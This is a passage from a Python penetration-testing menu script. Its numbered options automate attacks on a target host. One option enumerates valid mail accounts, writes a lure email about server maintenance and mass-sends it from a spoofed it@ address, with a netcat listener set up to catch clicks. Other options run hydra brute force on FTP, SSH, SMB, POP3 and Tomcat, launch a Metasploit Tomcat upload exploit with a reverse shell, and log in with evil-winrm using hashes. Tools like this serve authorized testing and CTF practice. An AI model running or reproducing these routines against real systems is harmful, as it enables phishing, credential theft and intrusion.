         print(colored("[!] WARNING!!! - Port 25 not found in remote live ports listing...", colour4))
         CheckParams = 1
         
      if CheckParams != 1:
         command("xdotool key Ctrl+Shift+T")
         command("xdotool key Alt+Shift+S; xdotool type 'Go Phishing'; xdotool key Return; sleep 2")
         command("xdotool type 'nc -nvlp 80'; xdotool key Return")
         command("xdotool key Ctrl+Shift+Tab")
                 
         command('echo "Hello.\n" > body.tmp')
         command('echo "We just performed maintenance on our servers." >> body.tmp')
         command('echo "Please verify if you can still access the login page:\n" >> body.tmp')
         command('echo "\t  <img src=\""' + localip + '"/img\">" >> body.tmp')
         command('echo "\t  Citrix http://"' + localip + '"/" >> body.tmp')
         command('echo "  <a href=\"http://"' + localip + '"\">click me.</a>" >> body.tmp')

         command('echo "\nRegards," >> body.tmp')
         command('echo "it@"' + DOM.rstrip(" ") + '""  >> body.tmp')
         
         print("[*] Created phishing email...\n")
         print(colored("Subject: Credentials/Errors\n", colour5))
         
         with open("body.tmp", "r") as list:
            for phish in list:
               phish = phish.rstrip("\n")
               print(colored(phish,colour5))
            print("")
            
         print("[*] Checking for valid usernames...")
         command("smtp-user-enum -U usernames.txt -d " + DOM.rstrip(" ") + " -m RCPT " + DOM.rstrip(" ") + " 25 | grep SUCC > valid1.tmp")                 
         command("tr -cd '\11\12\15\40-\176' < valid1.tmp > valid.tmp")
         
         match = 0         
         with open("valid.tmp", "r") as list:			# CLEAN FILE
            for line in list:
               line.encode('ascii',errors='ignore')
               line = line.rstrip("\n")
               line = line.replace('[92m','')
               line = line.replace('[00m','')
               line = line.replace('[SUCC] ', '')
               line = line.replace('250 OK', '')
               line = line.replace('...', '')
               line = line.replace(' ','')
               if "TEST" not in line:                  
                  command("echo " + line + " >> phish.tmp")
                  match = 1
                  
         if match == 1:						# SHOW FOUND PHISH
             print("[+] Found valid email addresses...\n")
             with open("phish.tmp", "r") as list:
                for line in list:
                   line = line.rstrip("\n")
                   print(colored(line + "@" + DOM.rstrip(" "),colour2))
                           
         if match == 1:
            print("\n[*] Phishing the list...")			# GO PHISHING
            with open("phish.tmp", "r") as list:
               for phish in list:
                  phish = phish.rstrip("\n")
                  phish = phish.strip(" ")
                  phish = phish + "@"
                  phish = phish + DOM.rstrip(" ")
                  command("swaks --to " + phish + " --from it@" + DOM.rstrip(" ") + " --header 'Subject: Credentials / Errors' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
                  print("[+] Mail sent to " + phish + "...")
         else:
            print("[-] No valid email addresses where found...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - GOBUSTER WEB ADDRESS/IP common.txt
# Details : Alternative dictionary - /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='68':
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
      else:
         if WEB[:5] == "EMPTY":
            command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50")
         else:
            if (WEB[:5] == "https") or (WEB[:5] == "HTTPS"):
               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u '" + WEB.rstrip(" ") + "' -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50 -k") 
            else: 
               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x bak,zip,php,html,pdf,txt,doc,xml -f -w /usr/share/dirb/wordlists/common.txt -t 50")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Nikto
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='69':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1
         
      if ":" in TIP:
         print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour4))
         CheckParams = 1         
         
      if CheckParams != 1:
         if WEB[:5] != "EMPTY":
            command("nikto -h " + WEB.rstrip(" "))
         else:
            command("nikto -h " + TIP.rstrip(" "))
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - HYDRA BRUTE FORCE FTP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='70':
      CheckParams = 0   

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1
         
      if CheckParams != 1:
         if os.path.getsize("usernames.txt") == 0:
            print("[-] Username file is empty...")
            if USER[:1] != "'":
               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
            else:
               print("[*] Adding user 'administrator'...")
               command("echo 'administrator' >> usernames.txt")
         
         if os.path.getsize("passwords.txt") == 0:             
            print("[-] Password file is empty...")
            if PASS[:1] != "'":
               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
            else:
               print("[*] Adding password 'password'...")
               command("echo password >> passwords.txt")
         
         if "21" in POR:
            command("hydra -P passwords.txt -L usernames.txt ftp://" + TIP.rstrip(" "))
         else:
            print("[-] FTP port not found in LIVE PORTS...")
         
         for x in range (0,maximum):
            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
            
      prompt() 
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - HYDRA BRUTE FORCE SSH
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='71':
      CheckParams = 0   

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1
         
      if CheckParams != 1:
         if os.path.getsize("usernames.txt") == 0:
            print("[-] Username file is empty...")
            if USER[:1] != "'":
               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
            else:
               print("[*] Adding user 'administrator'...")
               command("echo 'administrator' >> usernames.txt")
         
         if os.path.getsize("passwords.txt") == 0:             
            print("[-] Password file is empty...")
            if PASS[:1] != "'":
               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
            else:
               print("[*] Adding password 'password'...")
               command("echo password >> passwords.txt")
         
         if "22" in POR:
            command("hydra -P passwords.txt -L usernames.txt ssh://" + TIP.rstrip(" "))
         else:
            print("[-] SSH port not found in LIVE PORTS...")
         
         for x in range (0,maximum):
            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
            
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - HYDRA SMB BRUTEFORCE
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='72':
      CheckParams = 0   

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1
         
      if CheckParams != 1:
         if os.path.getsize("usernames.txt") == 0:
            print("[-] Username file is empty...")
            if USER[:1] != "'":
               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
            else:
               print("[*] Adding user 'administrator'...")
               command("echo 'administrator' >> usernames.txt")
         
         if os.path.getsize("passwords.txt") == 0:             
            print("[-] Password file is empty...")
            if PASS[:1] != "'":
               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
            else:
               print("[*] Adding password 'password'...")
               command("echo password >> passwords.txt")
         
         if "445" in POR:
            command("hydra -P passwords.txt -L usernames.txt smb://" + TIP.rstrip(" "))
         else:
            print("[-] SMB port not found in LIVE PORTS...")
         
         for x in range (0,maximum):
            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
            USER[x] = padding(USER[x], COL3)
            
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - HYDRA POP3 BRUTEFORCE
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='73':
      CheckParams = 0   

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1
         
      if CheckParams != 1:
         if os.path.getsize("usernames.txt") == 0:
            print("[-] Username file is empty...")
            if USER[:1] != "'":
               print("[*] Adding user '" + USR.rstrip(" ") + "'...")
               command("echo " + USR.rstrip(" ") + " >> usernames.txt")
            else:
               print("[*] Adding user 'administrator'...")
               command("echo 'administrator' >> usernames.txt")
         
         if os.path.getsize("passwords.txt") == 0:             
            print("[-] Password file is empty...")
            if PASS[:1] != "'":
               print("[*] Adding password '" + PAS.rstrip(" ") + "'...")
               command("echo '" + PAS.rstrip(" ") + "' >> passwords.txt")
            else:
               print("[*] Adding password 'password'...")
               command("echo password >> passwords.txt")
         
         if "110" in POR:
            command("hydra -P passwords.txt -L usernames.txt " + TIP.rstrip(" ") + " POP3")
         else:
            if "995" in POR:
               command("hydra -P passwords.txt -L usernames.txt " + TIP.rstrip(" ") + " POP3s")
            else:
               print("[-] POP3 ports not found in LIVE PORTS...")
               
         for x in range (0,maximum):
            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
            
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - TOMCAT WEB ADDRESS BRUTE FORCE
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='74':
      if WEB[:5] == "EMPTY":
         print("[-] Target web address not specified...")
      else:
         print("[*] Attempting a tomcat bruteforce on the specified web address, please wait...")
         
         os.remove("usernames.txt")
         os.remove("passwords.txt")
         
         with open('/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt', 'r') as userpasslist:
            for line in userpasslist:
               one, two = line.strip().split(':')
               command("echo " + one + " >> usernames.tmp")
               command("echo " + two + " >> passwords.tmp")
               
            command("cat usernames.tmp | sort -u > usernames.txt")
            command("cat passwords.tmp | sort -u > passwords.txt")
            command("rm *.tmp")
            
         if "http://" in WEB.lower():
            target = WEB.replace("http://","")
            command("hydra -L usernames.txt -P passwords.txt http-get://" + target.rstrip(" "))
         
         if "https://" in WEB.lower():
            target = target.replace("https://","")
            command("hydra -L usernames.txt -P passwords.txt https-get://" + target.rstrip(" "))
                          
         for x in range (0,maximum):
            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
            
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - MSFCONSOLE TOMCAT CLASSIC EXPLOIT
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='75':
      command("touch meterpreter.rc")
      command("echo 'use exploit/multi/http/tomcat_mgr_upload' >> meterpreter.rc")
      command("echo 'set RHOSTS " + TIP.rstrip(" ") + "' >> meterpreter.rc")
      if "8080" in POR:
         command("echo 'set RPORT 8080' >> meterpreter.rc")
      else:
         DATA = input("Please enter tomcat port number: ")
         command("echo 'set RPORT " + DATA + "' >> meterpreter.rc")
      DATA = PAS.rstrip(" ")
      command("echo 'set HttpPassword " + DATA + "' >> meterpreter.rc")
      DATA = USR.rstrip(" ")
      command("echo 'set HttpUsername " + DATA + "' >> meterpreter.rc")
      command("echo 'set payload java/shell_reverse_tcp' >> meterpreter.rc")
      command("hostname -I >> temp.tmp")
      target = linecache.getline("temp.tmp",1)
      os.remove("temp.tmp")
      one, two, three, four = target.split(" ")
      target = two.rstrip(" ")
      command("echo 'set lhost " + target + "' >> meterpreter.rc")
      command("echo 'run' >> meterpreter.rc")
      command("msfconsole -r meterpreter.rc")
      prompt() 
      os.remove("meterpreter.rc")  
           
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - rsync -av rsync://IP:873/SHARENAME SHARENAME
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='76':
      if "873" in POR:
         command("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
      else:
         print("[-] Port 873 not found in LIVE PORTS...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - rsync -a rsync://IP:873
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='77':
      if "873" in POR:
         command("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")
      else:
         print("[-] Port 873 not found in LIVE PORTS...")      
      prompt()   
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - rdesktop - u user -p password -d domain / IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='78':
      if TIP[:5] != "EMPTY":
         command("rdesktop -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' " + TIP.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Xfreeredp
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '79':
      if TIP[:5] != "EMPTY":
         command("xfreerdp /u:" + USR.rstrip(" ") + " /p:'" + PAS.rstrip(" ") + "' /v:" + TIP.rstrip(" "))
      prompt()  
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - FTP PORT 21
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='80':
      if TIP[:5] != "EMPTY":
         command("ftp " + TIP.rstrip(" ") + " 21")
      prompt()       
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - ssh -l USER IP -p PORT
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='81':
      if TIP[:5] != "EMPTY":
         command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " -p 22")
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - ssh -i id USER@IP -p 22
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='82':
      if TIP[:5] != "EMPTY":
         command("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -p 22")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - telnet -l USER IP PORT.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='83':
      if TIP[:5] != "EMPTY":
         command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " 23")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - nc IP PORT.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='84':
      if TIP[:5] != "EMPTY":
         command("nc " + TIP.rstrip(" ") + " 80")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - sqsh -H IP -L user=USER -L password=PASSWORD + exec xp_cmdshell 'whoami'; go PORT 1433
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='85':
      if TIP[:5] != "EMPTY":
         command("sqsh -S " + TIP.rstrip(" ") + " -L user=" + USR.rstrip(" ") + " -L password=" + PAS.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - MSSQLCLIENT PORT 1433
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='86':
      if TIP[:5] != "EMPTY":
         if DOM[:5] != "EMPTY":
            command(keypath + "mssqlclient.py " + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
         else:
            command(keypath + "mssqlclient.py " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - MYSQL PORT 3306
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='87':
      if TIP[:5] != "EMPTY":
         command("mysql -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -h " + TIP.rstrip(" "))
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Windows remote login on POR 5985.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='88':
      CheckParams = 0      
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP has not been specified...")
         CheckParams = 1
         
      if PAS.rstrip(" ") == "''":
         print("[-] Password has not been specified...")
         CheckParams = 1   
   
      if CheckParams == 1:
         if (NTM[:5] != "EMPTY") and (TIP[:5] != "EMPTY"):      
            print("[*] Using the HASH value as a login credential...")
            command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H '" + NTM.rstrip(" ") + "'")
         else:
            if (NTM[:5] == "EMPTY") or (NTM[:1] == "."):
               print("[-] Hash value has not been specified...")
                    
      if CheckParams == 0:
         command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "'")
      prompt() 
                 
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : Pr0J3CT_M@k30V3r                                                               
# Details : Menu option selected - Save current data to config.txt and exit the program.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '89':
      if os.path.exists("config.txt"):
         os.remove("config.txt")				# DELETE OLD CONFIG FILE
      command("touch config.txt")				# CREATE NEW CONFIG FILE
      command("echo " + DNS + " >> config.txt")
      command("echo " + TIP + " >> config.txt")
      command("echo " + POR + " >> config.txt")  
      command("echo " + WEB + " >> config.txt")  

      null = "\\'\\'"
      if USR.rstrip(" ") == "''":
         command("echo " + null + " >> config.txt")
      else:
         command("echo '" + USR  + "' >> config.txt")           
      if PAS.rstrip(" ") == "''":
         command("echo " + null + " >> config.txt")
      else:
         command("echo '" + PAS  + "' >> config.txt")     
 
      command("echo " + NTM + " >> config.txt")
      command("echo " + DOM + " >> config.txt")  
      command("echo " + SID + " >> config.txt")
      command("echo " + TSH + " >> config.txt")  
      command("echo " + LTM + " >> config.txt")  
      command("echo " + DIR + " >> config.txt")   
      
      if os.path.exists("PORTS.tmp"):
         os.remove("PORTS.tmp")
      if DOMC == 1:
         command("sed -i '$d' /etc/hosts")
      if len(os.listdir(DIR.rstrip(" "))) == 0:
         os.rmdir(DIR.rstrip(" "))
      exit(1)

# Eof...	
